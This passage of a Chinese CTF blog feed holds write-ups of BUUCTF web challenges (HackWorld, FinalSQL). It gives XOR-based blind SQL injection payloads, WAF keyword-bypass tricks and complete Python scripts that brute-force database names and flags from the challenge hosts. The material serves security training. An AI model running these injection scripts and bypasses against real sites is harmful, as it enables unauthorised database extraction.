<br>该网站过滤了ORDER<br>该网站过滤了OUTFILE<br>该网站过滤了updatexml<br>该网站过滤了format<br>该网站过滤了ord<br>该网站过滤了UPDATE<br>该网站过滤了/*<br>该网站过滤了`<br>该网站过滤了  <br>该网站过滤了for<br>该网站过滤了BEFORE<br>该网站过滤了sys schemma<br>该网站过滤了SEPARATOR<br>该网站过滤了XOR<br>该网站过滤了CURSOR<br>该网站过滤了FLOOR<br></code></pre></td></tr></table></figure><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">1<br></code></pre></td></tr></table></figure><p><img src="/images/2023-8-28-HackWorld/image-20230828141224893.png" alt="image-20230828141224893"></p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">1&#x27;<br></code></pre></td></tr></table></figure><p><img src="/images/2023-8-28-HackWorld/image-20230828141251957.png" alt="image-20230828141251957"></p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">1&#x27;#<br></code></pre></td></tr></table></figure><p><img src="/images/2023-8-28-HackWorld/image-20230828141354341.png" alt="image-20230828141354341"></p><p>所以由测试得该网站不回显数据库信息，只返回true或false的结果，所以我们需要采取盲注</p><p>2.选择盲注类型:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs txt">布尔盲注:<br>id=1 and 非0(true)或id=(1)and(非0(true))<br>返回id=1的界面<br>id=1 and 0(flase)或id=(1)and(0)<br>返回id=0的界面<br><br>异或盲注:<br>id=1^0(false)=&gt;1<br>返回id=1的界面<br>id=1^1(true)=&gt;0<br>返回id=0的界面<br>使用异或盲注需要后面有判断语句返回true和false<br><br>空字符或盲注:<br>id=&#x27;&#x27; or 非0(true)=&gt;1或id=&#x27;&#x27;or(非0(true))<br>返回id=1的界面<br>id=&#x27;&#x27; or 0(flase)=&gt;0或id=&#x27;&#x27;or(0)<br>返回id=0的界面<br></code></pre></td></tr></table></figure><p>由于and和or都被过滤，所以我们只能选择异或盲注</p><p>3.获取盲注true和false的界面</p><p>payload:</p><p>id&#x3D;0的界面</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">1^1<br></code></pre></td></tr></table></figure><p><img src="/images/2023-8-28-HackWorld/image-20230828143418789.png" alt="image-20230828143418789"></p><p>payload:</p><p>id&#x3D;1的界面</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">1^0<br></code></pre></td></tr></table></figure><p><img src="/images/2023-8-28-HackWorld/image-20230828143453303.png" alt="image-20230828143453303"></p><p>4.爆数据库信息:</p><p>由于limit被限制,所以长度规定可以为自由，使用GROUP_CONCAT()获取全部信息</p><p>第一步：直接爆数据库的名字:</p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">1^(ascii(substr(database(),1,1))&gt;79)<br></code></pre></td></tr></table></figure><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><br><span class="hljs-comment"># url是随时更新的，具体的以做题时候的为准</span><br><br><span class="hljs-comment"># 登录dvwa的header:</span><br><span class="hljs-comment"># headers = &#123;&#x27;Cookie&#x27;:&#x27;security=low; PHPSESSID=942m2p5g9t4uicc61v7o3gedd7&#x27;,</span><br><span class="hljs-comment">#            &#x27;Referer&#x27;:&#x27;http://localhost/DVWA/vulnerabilities/sqli_blind/&#x27;</span><br><span class="hljs-comment">#            &#125;</span><br><br><span class="hljs-comment"># 当前注入点的url传输格式:</span><br><span class="hljs-comment"># ?id=1&#x27;+and+length(database())%3D4+%23&amp;Submit=Submit#</span><br><br>url = <span class="hljs-string">&#x27;http://cbdddd87-2da0-4863-a3fa-3afcff406fb8.node4.buuoj.cn:81/index.php&#x27;</span><br>n = <span class="hljs-number">1</span><br><span class="hljs-comment"># 对数据库名字第n个字符进行暴力剖解</span><br><span class="hljs-comment"># payload:1&#x27; and ascii(substr(database(),n,1))&gt;100</span><br>database_name = <span class="hljs-string">&quot;&quot;</span><br>database_lenth = <span class="hljs-number">30</span> <span class="hljs-comment"># 手动规定数据库名字长度</span><br><span class="hljs-keyword">while</span> n &lt;= database_lenth:<br>    <span class="hljs-comment"># 从可打印字符开始</span><br>    begin = <span class="hljs-number">32</span><br>    end = <span class="hljs-number">126</span><br>    tmp = (begin + end) // <span class="hljs-number">2</span><br>    <span class="hljs-comment"># 对第n个字符进行判断</span><br>    <span class="hljs-keyword">while</span> (begin &lt; end):<br>        <span class="hljs-comment"># 根据当前网页url传输格式构造payload</span><br>        <span class="hljs-comment"># payload1:用于普通盲注</span><br>        <span class="hljs-comment"># payload1 = &quot;1&#x27;+and+ascii(substr(database()%2C&#123;&#125;%2C1))&gt;&#123;&#125;+%23&quot;.format(n, tmp)</span><br>        <br>        <span class="hljs-built_in">str</span> = <span class="hljs-string">&quot;1^(ascii(substr(database(),&#123;&#125;,1))&gt;&#123;&#125;)&quot;</span>.<span class="hljs-built_in">format</span>(n, tmp)<br>        payload2 = &#123;<br>            <span class="hljs-string">&quot;id&quot;</span>: <span class="hljs-built_in">str</span><br>        &#125;<br>        <span class="hljs-comment"># print(begin,end,tmp)</span><br>        <span class="hljs-comment"># 构造url请求,并存储返回的网页响应结果</span><br>        <span class="hljs-comment"># str = &quot;&amp;Submit=Submit#&quot; # 用于补全网页的url</span><br>        <span class="hljs-comment"># print(url + payload2)</span><br>        r = requests.post(url=url, data=payload2)<br>        <span class="hljs-comment"># 判断该payload所返回的网页是true界面还是false界面</span><br>        true_text = <span class="hljs-string">&quot;Error&quot;</span><br>        <span class="hljs-comment"># print(r.text)</span><br>        <span class="hljs-keyword">if</span> (true_text <span class="hljs-keyword">in</span> r.text):<br>            <span class="hljs-comment"># 返回true界面 </span><br>            begin = tmp + <span class="hljs-number">1</span><br>            tmp = (begin + end) // <span class="hljs-number">2</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-comment"># 返回flase界面</span><br>            end = tmp<br>            tmp = (begin + end) // <span class="hljs-number">2</span><br>    <span class="hljs-comment"># 最终begin==end,而此时的tmp就是该字符的ascii码</span><br>    <span class="hljs-comment"># print(tmp)</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;该数据库的第%d个字符:%c&quot;</span> % (n, <span class="hljs-built_in">chr</span>(tmp)))<br>    database_name = database_name + <span class="hljs-built_in">chr</span>(tmp)<br>    <span class="hljs-comment"># 对下一个字符进行判断</span><br>    n = n + <span class="hljs-number">1</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;该数据库的名字为：&quot;</span>+database_name)<br></code></pre></td></tr></table></figure><p>输出:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">该数据库的名字为：ctftraih<br></code></pre></td></tr></table></figure><p>第二步：由于由题目提示得，flag在flag表的flag字段中，所以直接爆flag字段信息即可:</p><p>select被过滤的绕过方式:</p><p>大小写绕过法:</p><p>该方法适用于任何在mysql中执行的单词代码</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs txt">seleCt<br>SeLeCt<br>SELect<br>.......<br></code></pre></td></tr></table></figure><p>测试:</p><p><img src="/images/2023-8-28-HackWorld/image-20230828152946191.png" alt="image-20230828152946191"></p><p>内联注释绕过:</p><p>当一些关键语句被过滤时，内联注释就是把一些特有的仅在 mysql 上的语句放在 &#x2F;*!  *&#x2F;中，这样这些语句如果在其它数据库中是不会被执行，但在 mysql 中会执行.</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs txt">/*!select*/<br>/*!sElect*/<br>.....<br></code></pre></td></tr></table></figure><p>测试:</p><p><img src="/images/2023-8-28-HackWorld/image-20230828153246186.png" alt="image-20230828153246186"></p><p>使用大小写绕过方式测试:</p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">1seLeCt<br></code></pre></td></tr></table></figure><p><img src="/images/2023-8-28-HackWorld/image-20230828153509802.png" alt="image-20230828153509802"></p><p>通过响应结果可知，可以绕过</p><p>由于group_concat也被过滤，且通过不断尝试，发现大小写都无法绕过，这里我们直接猜测该flag字段只有一行内容，且为flag的值</p><p>测试:</p><p><img src="/images/2023-8-28-HackWorld/image-20230828154057973.png" alt="image-20230828154057973"></p><p>只有substr中select返回的只有一行内容时，才不会发生报错</p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">?id=1^(ascii(substr((seLEct(&#123;flag&#125;)from(&#123;flag&#125;)),&#123;&#125;,1))&gt;&#123;&#125;)<br></code></pre></td></tr></table></figure><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><br><span class="hljs-comment"># url是随时更新的，具体的以做题时候的为准</span><br><br><span class="hljs-comment"># 登录dvwa的header:</span><br><span class="hljs-comment"># headers = &#123;&#x27;Cookie&#x27;:&#x27;security=low; PHPSESSID=942m2p5g9t4uicc61v7o3gedd7&#x27;,</span><br><span class="hljs-comment">#            &#x27;Referer&#x27;:&#x27;http://localhost/DVWA/vulnerabilities/sqli_blind/&#x27;</span><br><span class="hljs-comment">#            &#125;</span><br><br><span class="hljs-comment"># 当前注入点的url传输格式:</span><br><span class="hljs-comment"># ?id=1&#x27;+and+ascii(substr((select+user+from+dvwa.users+limit+0%2C1)%2C1%2C1))%3D110+%23</span><br><br>url = <span class="hljs-string">&#x27;http://cbdddd87-2da0-4863-a3fa-3afcff406fb8.node4.buuoj.cn:81/index.php&#x27;</span><br><br><span class="hljs-comment"># database_name存储数据库名字</span><br>database_name = <span class="hljs-string">&quot;ctftraih&quot;</span><br><span class="hljs-comment"># table_name存储指定表的名字</span><br>table_name = <span class="hljs-string">&quot;flag&quot;</span><br><span class="hljs-comment"># col_name存储指定字段的名字</span><br>col_name = <span class="hljs-string">&quot;flag&quot;</span><br><span class="hljs-comment"># col_data_num存储有多少列</span><br><span class="hljs-comment"># 手动指定要查看多少列数据，由于合在一起显示所以只有一列</span><br>col_data_num = <span class="hljs-number">1</span><br><span class="hljs-comment"># col_data_charnum存储每个字段数据的字符个数</span><br><span class="hljs-comment"># 手动指定要查看多少字符数据</span><br>col_data_charnum = <span class="hljs-number">50</span><br><br>rank_index = <span class="hljs-number">0</span><br><span class="hljs-comment"># 先遍历该字段有多少列</span><br><span class="hljs-keyword">while</span> (rank_index &lt; col_data_num):<br>    rank_data_index = <span class="hljs-number">0</span><br>    <span class="hljs-comment"># data用来字段该列的数据</span><br>    data = <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">while</span> (rank_data_index &lt; col_data_charnum):<br>        <span class="hljs-comment"># 用二分法对当前字段进行猜解</span><br>        <span class="hljs-comment"># 从可打印字符开始</span><br>        begin = <span class="hljs-number">32</span><br>        end = <span class="hljs-number">126</span><br>        tmp = (begin + end) // <span class="hljs-number">2</span><br>        <span class="hljs-comment"># 对第n个字符进行判断</span><br>        <span class="hljs-keyword">while</span> (begin &lt; end):<br>            <span class="hljs-comment"># 根据当前网页url传输格式构造payload</span><br>            <span class="hljs-comment"># payload1:用于普通盲注</span><br>            <span class="hljs-comment"># payload1 = &quot;1&#x27;+and+ascii(substr((select+&#123;&#125;+from+&#123;&#125;.&#123;&#125;+limit+&#123;&#125;%2C1)%2C&#123;&#125;%2C1))&gt;&#123;&#125;+%23&quot;.format(col_name, database_name, table_name, rank_index, rank_data_index+1, tmp)</span><br>            <span class="hljs-comment"># payload2 = &quot;1^(ascii(substr((select(GROUP_CONCAT(&#123;&#125;))from(&#123;&#125;)),&#123;&#125;,1))&gt;&#123;&#125;)&quot;.format(col_name, table_name, rank_data_index+1, tmp)</span><br>            <span class="hljs-built_in">str</span> = <span class="hljs-string">&quot;1^(ascii(substr((seLEct(&#123;&#125;)from(&#123;&#125;)),&#123;&#125;,1))&gt;&#123;&#125;)&quot;</span>.<span class="hljs-built_in">format</span>(col_name, table_name, rank_data_index+<span class="hljs-number">1</span>, tmp)<br>            <span class="hljs-comment"># print(str)</span><br>            payload2 = &#123;<br>                <span class="hljs-string">&quot;id&quot;</span>: <span class="hljs-built_in">str</span><br>            &#125;<br>            <span class="hljs-comment"># print(table_name[table_index], col_index, col_len_index, tmp)</span><br>            <span class="hljs-comment"># 构造url请求,并存储返回的网页响应结果</span><br>            <span class="hljs-comment"># str = &quot;&amp;Submit=Submit#&quot; # 用于补全网页的url</span><br>            <span class="hljs-comment"># print(url + payload1 + str)</span><br>            r = requests.post(url=url, data=payload2)<br>            time.sleep(<span class="hljs-number">0.1</span>)<br>            <span class="hljs-comment"># 判断该payload所返回的网页是true界面还是false界面</span><br>            true_text = <span class="hljs-string">&quot;Error&quot;</span><br>            <span class="hljs-comment"># print(r.text)</span><br>            <span class="hljs-keyword">if</span> (true_text <span class="hljs-keyword">in</span> r.text):<br>                <span class="hljs-comment"># 返回true界面 </span><br>                <span class="hljs-comment"># print(&quot;true&quot;)</span><br>                begin = tmp + <span class="hljs-number">1</span><br>                tmp = (begin + end) // <span class="hljs-number">2</span><br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-comment"># 返回flase界面</span><br>                end = tmp<br>                tmp = (begin + end) // <span class="hljs-number">2</span><br>        <span class="hljs-comment"># 最终begin==end,而此时的tmp就是该字符的ascii码</span><br>        <span class="hljs-comment"># print(tmp)</span><br>        data = data + <span class="hljs-built_in">chr</span>(tmp)<br>        <span class="hljs-comment"># 继续下一个字符</span><br>        rank_data_index = rank_data_index + <span class="hljs-number">1</span><br>    <span class="hljs-comment"># 继续下一列</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;&#123;&#125;字段第&#123;&#125;列的值:&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(col_name, rank_index + <span class="hljs-number">1</span>, data))<br>    rank_index = rank_index + <span class="hljs-number">1</span><br><br></code></pre></td></tr></table></figure><p>输出:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">flag字段第1列的值:flag&#123;8ee345ea-b7e7-4384-883c-f953214c7f79&#125; <br></code></pre></td></tr></table></figure><p>flag &#x3D; flag{8ee345ea-b7e7-4384-883c-f953214c7f79} </p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>BUUCTF_WEB_[极客大挑战 2019]FinalSQL 题解</title>
    <link href="/2023/08/28/2023-08-28-%5B%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019%5DFinalSQL/"/>
    <url>/2023/08/28/2023-08-28-%5B%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019%5DFinalSQL/</url>
    
    <content type="html"><![CDATA[<h2 id="极客大挑战-2019-FinalSQL"><a href="#极客大挑战-2019-FinalSQL" class="headerlink" title="[极客大挑战 2019]FinalSQL"></a>[极客大挑战 2019]FinalSQL</h2><p>1.进入页面:</p><p><img src="/images/2023-8-28-FinalSQL/image-20230828094221524.png" alt="image-20230828094221524"></p><p>发现题目提示有盲注</p><p>2.由于我们不知道正确的用户名和密码，所以我们不能通过用户名密码的输入来获取true和false页面的响应，因为在不知道正确的用户名和密码的情况下，无论如何返回的都是false界面，所以我们需要寻找其它的盲注注入点</p><p>3.根据题目提示选择神秘代码:<br>点击1:</p><p><img src="/images/2023-8-28-FinalSQL/image-20230828094621301.png" alt="image-20230828094621301"></p><p>点击2：</p><p><img src="/images/2023-8-28-FinalSQL/image-20230828094644745.png" alt="image-20230828094644745"></p><p>点击3：</p><p><img src="/images/2023-8-28-FinalSQL/image-20230828094710975.png" alt="image-20230828094710975"></p><p>点击4：</p><p><img src="/images/2023-8-28-FinalSQL/image-20230828094729078.png" alt="image-20230828094729078"></p><p>点击5：</p><p><img src="/images/2023-8-28-FinalSQL/image-20230828094752529.png" alt="image-20230828094752529"></p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">?id=6<br></code></pre></td></tr></table></figure><p><img src="/images/2023-8-28-FinalSQL/image-20230828094924021.png" alt="image-20230828094924021"></p><p>没有获得有用的信息，但是我们可以通过id这个注入点进行盲注</p><p>4.盲注原理:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs txt">布尔盲注:<br>id=1 and 非0(true)<br>返回id=1的界面<br>id=1 and 0(flase)<br>返回id=0的界面<br><br>异或盲注:<br>id=1^0(false)=&gt;1<br>返回id=1的界面<br>id=1^1(true)=&gt;0<br>返回id=0的界面<br>使用异或盲注需要后面有判断语句返回true和false<br><br>空字符或盲注:<br>id=&#x27;&#x27; or 非0(true)=&gt;1<br>返回id=1的界面<br>id=&#x27;&#x27; or 0(flase)=&gt;0<br>返回id=0的界面<br></code></pre></td></tr></table></figure><p>测试:</p><p>mysql中true表示1:</p><p><img src="/images/2023-8-28-FinalSQL/image-20230828100019926.png" alt="image-20230828100019926"></p><p>mysql中false表示0:</p><p><img src="/images/2023-8-28-FinalSQL/image-20230828100110579.png" alt="image-20230828100110579"></p><p>5.随便注入，查看当前页面过滤的内容:</p><p>脚本:</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><span class="hljs-comment"># 打开读取SQL_fuzz文件</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;SQL_fuzz.txt&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>) <span class="hljs-keyword">as</span> f:<br>    contents = f.readlines()<br>    <span class="hljs-comment"># print(contents)</span><br><span class="hljs-comment"># 删除读取数据中的&#x27;\n&#x27;</span><br>data_list = []<br><span class="hljs-keyword">for</span> msg <span class="hljs-keyword">in</span> contents:<br>    msg = msg.strip(<span class="hljs-string">&#x27;\n&#x27;</span>)<br>    <span class="hljs-comment"># # 字符串根据空格进行分割</span><br>    <span class="hljs-comment"># d = msg.split(&#x27; &#x27;)</span><br>    data_list.append(msg)<br>f.close<br><span class="hljs-comment"># print(data_list)</span><br><br><span class="hljs-comment"># 进行fuzz注入</span><br>url = <span class="hljs-string">&quot;http://3f8893c2-6eda-4113-bcfa-2b6188684bd7.node4.buuoj.cn:81/search.php?id=&quot;</span><br><span class="hljs-comment"># GET请求</span><br><span class="hljs-keyword">for</span> data <span class="hljs-keyword">in</span> data_list:<br>    r = requests.get(url+data)<br>    <span class="hljs-comment"># 使用time使请求能够拥有足够的时间去响应</span><br>    time.sleep(<span class="hljs-number">0.04</span>)<br>    <span class="hljs-comment"># 获取过滤网站响应信息</span><br>    reponse_txt = <span class="hljs-string">&quot;臭弟弟&quot;</span><br>    <span class="hljs-keyword">if</span> (reponse_txt <span class="hljs-keyword">in</span> r.text):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;该网站过滤了&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(data))<br><br><span class="hljs-comment"># POST请求</span><br><span class="hljs-comment"># for d in data_list:</span><br><span class="hljs-comment">#     payload = &#123;</span><br><span class="hljs-comment">#         &quot;&quot;: d</span><br><span class="hljs-comment">#     &#125;</span><br><span class="hljs-comment">#     r = requests.post(url=url, data=payload)</span><br><span class="hljs-comment">#     reponse_txt = &quot;臭弟弟&quot;</span><br><span class="hljs-comment">#     if (reponse_txt in r.text):</span><br><span class="hljs-comment">#         print(&quot;该网站过滤了&#123;&#125;&quot;.format(data))</span><br></code></pre></td></tr></table></figure><p>输出:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs txt">该网站过滤了length Length<br>该网站过滤了handler<br>该网站过滤了likeLiKe<br>该网站过滤了having<br>该网站过滤了limitLimIt<br>该网站过滤了insertinsERTINSERT<br>该网站过滤了!<br>该网站过滤了%<br>该网站过滤了ANDANd<br>该网站过滤了BYBy<br>该网站过滤了unionUNIonUNION<br>该网站过滤了||<br>该网站过滤了//*<br>该网站过滤了*/*<br>该网站过滤了/**/<br>该网站过滤了anandd<br>该网站过滤了HAVING<br>该网站过滤了IF<br>该网站过滤了INTO<br>该网站过滤了LIKE<br>该网站过滤了|<br>该网站过滤了UNION<br>该网站过滤了AND<br>该网站过滤了drop<br>该网站过滤了DROP<br>该网站过滤了rand()<br>该网站过滤了LIMIT<br>该网站过滤了by<br>该网站过滤了OUTFILE<br>该网站过滤了VARCHAR<br>该网站过滤了/*<br>该网站过滤了mid<br>该网站过滤了RLIKE<br>该网站过滤了sys schemma<br>该网站过滤了%0c<br>该网站过滤了@<br>该网站过滤了else%27%23%22%20<br></code></pre></td></tr></table></figure><p>6.发现and被过滤，所以我们可以采用以下盲注：</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs txt">异或盲注:<br>id=1^0(false)=&gt;1<br>返回id=1的界面<br>id=1^1(true)=&gt;0<br>返回id=0的界面<br><br>空字符或盲注:<br>id=&#x27;&#x27; or 非0(true)=&gt;1<br>返回id=1的界面<br>id=&#x27;&#x27; or 0(flase)=&gt;0<br>返回id=0的界面<br></code></pre></td></tr></table></figure><p>测试:</p><p>返回id&#x3D;1:</p><p><img src="/images/2023-8-28-FinalSQL/image-20230828140656279.png" alt="image-20230828140656279"></p><p>返回id&#x3D;0:</p><p><img src="/images/2023-8-28-FinalSQL/image-20230828140743288.png" alt="image-20230828140743288"></p><p><strong>使用异或盲注构造payload,由于过滤了limit,所以不能用普通的payload:</strong></p><p>第一步：爆数据库名字的长度,由于length被过滤，所以我们采取暴力破解（规定查找长度为30）</p><p>第二步：爆数据库的名字</p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">1^(ascii(substr(database(),&#123;&#125;,1))&gt;&#123;&#125;)<br></code></pre></td></tr></table></figure><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><br><span class="hljs-comment"># url是随时更新的，具体的以做题时候的为准</span><br><br><span 